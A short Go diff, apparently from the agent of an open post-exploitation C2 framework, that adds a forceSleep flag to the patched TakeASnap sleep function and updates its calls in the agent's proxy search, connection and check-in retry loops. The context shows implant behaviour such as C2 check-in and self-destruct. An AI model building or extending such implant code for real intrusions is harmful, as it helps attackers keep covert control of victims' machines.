@@ -51,8 +51,13 @@ func agent_main() {
 	// if run by stager, patch util.TakeASnap to trigger SIGSTOP
 	if common.RuntimeConfig.IsRunByStager {
 		logging.Println("Agent is run by a stager, patching util.TakeASnap to trigger SIGSTOP")
-		util.TakeASnap = func() {
-			conditionalC2FailNotify()
+		origTakeASnap := util.TakeASnap
+		util.TakeASnap = func(forceSleep bool) {
+			if forceSleep {
+				origTakeASnap(forceSleep)
+			} else {
+				conditionalC2FailNotify()
+			}
 		}
 	}
 
@@ -157,7 +162,7 @@ func agent_main() {
 			logging.Printf("[+] Thank you! We got a proxy: %s", common.RuntimeConfig.C2TransportProxy)
 			break
 		}
-		util.TakeASnap()
+		util.TakeASnap(false)
 	}
 
 	isCheckedIn := false
@@ -177,7 +182,7 @@ connect:
 	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 	if def.HTTPClient == nil {
 		logging.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
-		util.TakeASnap()
+		util.TakeASnap(false)
 		goto connect
 	}
 	if common.RuntimeConfig.C2TransportProxy != "" {
@@ -195,7 +200,7 @@ connect:
 				logging.Fatalf("Duplicated checkin, self-destructing...")
 			}
 			logging.Printf("CheckIn error: %v, sleeping, will retry later", err)
-			util.TakeASnap()
+			util.TakeASnap(false)
 			goto connect
 		}
 		logging.Printf("Checked in on CC: %s", def.CCAddress)
